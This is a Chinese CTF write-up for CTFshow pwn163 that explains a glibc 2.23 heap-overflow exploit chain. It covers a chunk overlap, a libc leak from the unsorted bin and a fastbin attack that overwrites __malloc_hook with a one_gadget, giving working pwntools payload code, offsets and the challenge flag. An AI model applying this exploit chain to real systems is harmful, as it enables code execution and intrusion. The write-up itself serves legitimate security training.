---
title: CTFshow pwn163 Heap Overlap WP
published: 2026-04-16
updated: 2026-04-17
description: 利用 edit 堆溢出制造 chunk overlap，从 unsorted bin 泄露 libc，再完成 fastbin attack 打 __malloc_hook。
tags: [CTFshow, Pwn, Heap, Unsorted Bin, Fastbin]
category: ctfshow_pwn
draft: false
---

# pwn163 WP

## 题目信息

- 题目：`CTFshow easy heap`
- 远程：`nc pwn.challenge.ctf.show 28175`
- 远程环境：`Ubuntu 16.04`
- 使用 libc：`../libcs/ubuntu16/64bit/libc-2.23.so`
- flag：`ctfshow{1b441545-57d3-450a-8c8e-45e872eb2287}`

## 附件下载

- [下载题目附件 `pwn`](../../attachments/ctfshow_pwn/pwn163/pwn)
- [下载利用脚本 `exp.py`](../../attachments/ctfshow_pwn/pwn163/exp.py)
- [下载对应 libc `libc-2.23.so`](../../attachments/ctfshow_pwn/libcs/ubuntu16/64bit/libc-2.23.so)

## 保护与总体结论

从二进制反汇编可以看出：

- `Full RELRO`
- `Canary`
- `NX`
- `No PIE`

这意味着：

- 不能直接改 GOT
- 不能直接栈上执行 shellcode
- 程序基址固定，但 libc 仍然需要泄露

这题的核心漏洞只有一个：`edit` 存在堆溢出。

## 程序逻辑

程序有 16 个槽位，每个槽位结构可以理解成：

```c
struct note {
    int used;
    size_t size;
    void *ptr;
};
```

菜单有四个核心操作：

- `create`
- `edit`
- `free`
- `show`

### create

`create` 的逻辑比较规整：

- 找到第一个空槽
- 读入申请大小
- 限制最大值到 `0x1000`
- `calloc(size, 1)`
- 记录 `used/size/ptr`

这一段本身没有明显漏洞。

### free

`free` 的逻辑也比较干净：

- 校验 index
- 校验 `used == 1`
- 先把 `used` 清 0
- 再把 `size` 清 0
- `free(ptr)`
- 最后把 `ptr` 清 0

所以这题不是：

- `UAF`
- `double free`
- `show after free`

至少程序表层逻辑不是靠这些点。

### show

`show` 会按保存的 `size` 输出整块内容：

```c
write(1, note[idx].ptr, note[idx].size);
```

这个函数本身也不危险，危险来自于：如果我们能让 `ptr` 指向的区域与 free chunk 重叠，那么 `show` 就能把 free chunk 里的链表指针打印出来。

### edit

真正的洞在这里。

逻辑可还原成：

```c
void edit(note *table) {
    int idx = read_int();
    if (idx < 0 || idx > 15) return;
    if (table[idx].used != 1) return;

    printf("Size: ");
    int n = read_int();
    if (n <= 0) return;

    printf("Content: ");
    read_n(table[idx].ptr, n);
}
```

关键问题是：

- `n` 完全由用户控制
- 程序没有检查 `n <= table[idx].size`

所以可以对当前 chunk 向后溢出，覆盖相邻 chunk 的头部。

## 利用思路总览

整体思路分两段：

1. 先做 `chunk overlap`，再从 `unsorted bin` 泄露 libc
2. 再利用重叠块去篡改 `fastbin fd`，把 `0x70 fastbin` 打到 `__malloc_hook - 0x23`

最后通过覆盖 `__malloc_hook` 为 `one_gadget`，再触发一次 `malloc` 拿 shell。

这题是典型的：

- 先泄露 libc
- 再 fastbin attack
- 最终打 `__malloc_hook`

由于远程是 `Ubuntu 16.04 + glibc 2.23`，没有 tcache，所以这个打法正好成立。

## 初始堆布局

脚本前四次申请：

```python
add(io, 0x40)  # 0
add(io, 0x40)  # 1
add(io, 0x40)  # 2
add(io, 0x60)  # 3
```

在 glibc 2.23 下，大致布局如下：

```text
chunk0: request 0x40 -> real size 0x50
chunk1: request 0x40 -> real size 0x50
chunk2: request 0x40 -> real size 0x50
chunk3: request 0x60 -> real size 0x70
```

按内存顺序就是：

```text
[ chunk0 ][ chunk1 ][ chunk2 ][ chunk3 ]
```

## 第一阶段：制造重叠并泄露 libc

### Step 1. 从 chunk0 溢出，伪造 chunk1 的 size

对应脚本：

```python
edit(io, 0, b"A" * 0x40 + p64(0) + p64(0xA1))
```

这里为什么是这串 payload：

- `chunk0` 用户区大小是 `0x40`
- 写满 `0x40` 后，接下来正好覆盖到 `chunk1` 的 chunk header
- chunk header 中最重要的是：
  - `prev_size`
  - `size`

于是这次写入的含义是：

```text
chunk0 data: "A" * 0x40
chunk1.prev_size = 0
chunk1.size      = 0xA1
```

这里把 `chunk1.size` 改成 `0xA1` 的目的，是让 glibc 认为：

- `chunk1` 是一个真实大小为 `0xA0` 的 chunk
- 这个大小会覆盖原本的 `chunk1 + chunk2`

也就是说，我们人为把一个原本只有 `0x50` 的 chunk1，伪造成了一个覆盖更大范围的大 chunk。

### Step 2. free(chunk1)

对应脚本：

```python
delete(io, 1)
```

由于被伪造成了 `0xA0` 大小，glibc 在 `free(chunk1)` 时会把它当成一个 `unsorted bin` chunk 处理。

这时发生的关键效果不是“程序视角 free 了 index1”，而是“堆管理器视角把一块覆盖 chunk1 和 chunk2 所在区域的大空闲块插进了 unsorted bin”。

于是：

- 程序里 `idx 2` 仍然还认为自己有效
- 但从 glibc 角度，`idx 2` 指向的区域已经落在一个 free chunk 里面了

这就形成了重叠。

### Step 3. 再申请一个 0x40

对应脚本：

```python
add(io, 0x40)
```

这一步会从刚才那个大的 unsorted chunk 里切一块出来返回。

切完之后，剩下的后半部分仍然是 free chunk。

最关键的是：

- 新申请出来的块占用了原来大 free chunk 的前半部分
- `chunk2` 原来的指针仍然落在这块大 free chunk 的后半部分内部

于是 `idx 2` 实际上就成了一个“指向 free chunk 内部”的悬挂有效指针。

程序自己不知道这一点，因为它只看 `used == 1`。

### Step 4. show(chunk2) 泄露 unsorted bin 指针

对应脚本：

```python
show(io, 2)
leak = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
```

为什么这里能泄露 libc：

- glibc 2.23 中，unsorted bin free chunk 的用户区开头会放双向链表指针
- 这些指针会指向 `main_arena`
- `main_arena` 位于 libc 中

而此时：

- `idx 2` 的 `ptr` 正好指向这个 free chunk 内部
- `show(2)` 会把这里的数据原样输出

所以我们能读到类似：

```text
fd -> main_arena+offset
bk -> main_arena+offset
```

脚本里用的是最常见的 6 字节读法，拼成 64 位地址。

### Step 5. 由泄露值反推 libc 基址

对应脚本：

```python
malloc_hook = leak - 0x10 - 88
libc.address = malloc_hook - libc.sym["__malloc_hook"]
```

为什么这么算：

- 泄露出来的是 `main_arena` 某个固定偏移位置
- 在 glibc 2.23 中常见关系是：

```text
unsorted bin fd = main_arena + 88
main_arena      = __malloc_hook + 0x10
```

所以：

```text
__malloc_hook = leak - 88 - 0x10
libc_base = __malloc_hook - offset(__malloc_hook)
```

有了 libc 基址，就能算出：

- `__malloc_hook`
- `realloc`
- `one_gadget`

对应脚本：

```python
realloc = libc.sym["realloc"]
fake_chunk = libc.sym["__malloc_hook"] - 0x23
one_gadget = libc.address + 0x4526A
```

这里要注意，`libc.address` 设好后，`libc.sym[...]` 取出来就是运行时真实地址。

## 第二阶段：fastbin attack 打到 __malloc_hook

第一阶段只是泄露 libc。真正劫持控制流在第二阶段。

### Step 6. free(chunk3)

对应脚本：

```python
delete(io, 3)
```

`chunk3` 的申请大小是 `0x60`，对应真实 chunk size 是 `0x70`。

在 glibc 2.23 中，它会进入 `fastbin[0x70]`。

此时 fastbin 链表大概是：

```text
fastbin[0x70] -> chunk3
```

### Step 7. 用重叠的 chunk2 篡改 chunk3 的 fd

对应脚本：

```python
edit(io, 2, b"B" * 0x40 + p64(0) + p64(0x71) + p64(fake_chunk))
```

这是整题第二个核心 payload。

为什么 `idx 2` 能改到 `chunk3`：

- 第一阶段后，`idx 2` 已经不是一个正常独立 chunk
- 它指向的是一个与后续 chunk 重叠的区域
- 所以从 `chunk2` 写出 `0x40 + 0x10 + 0x8` 这些字节后，就能碰到 `chunk3` 的头

这串 payload 的含义是：

```text
"B" * 0x40           -> 填到当前 chunk2 用户区末尾
p64(0)               -> 覆盖相邻 chunk 的 prev_size
p64(0x71)            -> 把目标 fastbin chunk 的 size 保持成合法的 0x71
p64(__malloc_hook-0x23) -> 把 fastbin fd 改成 fake_chunk
```

这里 `0x71` 很重要：

- fastbin chunk 的 size 必须看起来合法
- `0x70 | PREV_INUSE = 0x71`

而 `fd = __malloc_hook - 0x23` 是 glibc 2.23 打 `__malloc_hook` 的经典写法。

原因是：

- 对 `malloc(0x60)`，返回给用户的是 chunk header 后面的用户区地址
- 如果 fake chunk 放在 `__malloc_hook - 0x23`
- 那么返回的用户指针就会落在 `__malloc_hook - 0x13`
- 再通过适当填充，就能把某个 8 字节值精确写到 `__malloc_hook`

### Step 8. 连续两次 malloc(0x60)

对应脚本：

```python
add(io, 0x60)
add(io, 0x60)
```

第一下：

- 取出真正的 `chunk3`

第二下：

- 由于 `chunk3.fd` 已经被改成 `__malloc_hook - 0x23`
- glibc 会把这个 fake chunk 当成 fastbin 链表下一个节点
- 返回的块就落在 `__malloc_hook` 附近

这时第二次申请出来的索引，也就是脚本中的 `idx 4`，本质上已经是一个“指向 `__malloc_hook-0x13` 附近的可写指针”。

### Step 9. 覆盖 __malloc_hook

对应脚本：

```python
edit(io, 4, b"C" * (0x13 - 8) + p64(one_gadget) + p64(realloc + 8))
```

这里为什么是 `(0x13 - 8)`：

- 申请返回的用户指针不是从 `__malloc_hook - 0x23` 开始，而是从 fake chunk 用户区开始
- 实际返回位置在 `__malloc_hook - 0x13`
- 要把接下来写入的 8 字节正好对齐到 `__malloc_hook`

所以：

```text
padding = 0x13 - 0x8 = 0x0b
```

也就是先填 `0x0b` 字节，再写 8 字节 `one_gadget`。

后面的 `p64(realloc + 8)` 是经典搭配：

- 某些 `one_gadget` 对寄存器/栈状态有要求
- 把后一个位置布成 `realloc+8`，通常能让执行路径更稳定

在这题里，使用的 `one_gadget` 偏移是：

```text
0x4526a
```

对应实际运行时地址：

```python
one_gadget = libc.address + 0x4526A
```

### Step 10. 再次触发 malloc

对应脚本：

```python
add(io, 0x10)
```

只要再走一次 `malloc`，glibc 就会调用：

```text
__malloc_hook(size, caller)
```

而我们已经把 `__malloc_hook` 改成了 `one_gadget`，所以程序直接跳进 gadget，拿到 shell。

## 拿 flag

拿到 shell 后直接读取：

```sh
cat /flag
```

结果是：

```text
ctfshow{1b441545-57d3-450a-8c8e-45e872eb2287}
```

## exp 对照说明

当前目录下的 `exp.py` 可以分成这几段理解。

### 1. 基础菜单封装

```python
def add(io, size):
def edit(io, idx, data):
def delete(io, idx):
def show(io, idx):
```

只是把菜单交互包装一下，没有技巧。

### 2. overlap + leak

```python
add(io, 0x40)
add(io, 0x40)
add(io, 0x40)
add(io, 0x60)

edit(io, 0, b"A" * 0x40 + p64(0) + p64(0xA1))
delete(io, 1)
add(io, 0x40)

show(io, 2)
leak = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
```

这段只做一件事：

- 通过伪造 chunk1 size，制造 chunk overlap
- 再从重叠出来的 free chunk 中泄露 libc

### 3. 计算关键地址

```python
malloc_hook = leak - 0x10 - 88
libc.address = malloc_hook - libc.sym["__malloc_hook"]
realloc = libc.sym["realloc"]
fake_chunk = libc.sym["__malloc_hook"] - 0x23
one_gadget = libc.address + 0x4526A
```

这段是把泄露值转成可利用地址。

### 4. fastbin attack

```python
delete(io, 3)
edit(io, 2, b"B" * 0x40 + p64(0) + p64(0x71) + p64(fake_chunk))
add(io, 0x60)
add(io, 0x60)
```

这段的作用是：

- 释放一个 `0x70 fastbin chunk`
- 用重叠块把它的 `fd` 改到 `__malloc_hook - 0x23`
- 连续申请两次，把 malloc 返回位置引导到 `__malloc_hook` 附近

### 5. 覆盖 hook 并触发

```python
edit(io, 4, b"C" * (0x13 - 8) + p64(one_gadget) + p64(realloc + 8))
add(io, 0x10)
```

这段就是最终劫持控制流：

- `edit(4, ...)` 往 `__malloc_hook` 上写 gadget
- `add(0x10)` 再次触发 `malloc`

## 为什么这题能这样做

这题成立的核心前提有三个：

### 1. edit 没有限制写入长度

如果 `edit` 按真实 chunk 大小截断，就不会有任何后续。

### 2. 远程是 glibc 2.23

因为没有 tcache，所以：

- `0xa0` chunk 会进 unsorted bin
- `0x70` chunk 会进 fastbin

整个打法都依赖这个行为。

### 3. 程序的 show 会按保存的 size 原样输出

虽然程序层面没有 UAF，但 chunk overlap 让“逻辑仍然有效的 note”指向了“glibc 已经 free 的 chunk 区域”，从而完成信息泄露。

## 这题学到什么

这题最值得记住的不是 payload 本身，而是利用顺序：

1. 先找堆溢出能改谁的头
2. 再看能否伪造更大的 chunk，做 overlap
3. overlap 后优先想信息泄露
4. 有了 libc 基址再考虑 fastbin attack
5. 最后打 `__malloc_hook`

换句话说，这题不是“一个 payload 直接秒了”，而是：

- 第一个溢出用来构造重叠
- 重叠用来泄露
- 泄露后第二次利用重叠块做 fastbin attack
- 最终才劫持控制流

这是非常标准、也非常值得反复练的 `glibc 2.23 heap overflow` 利用链。
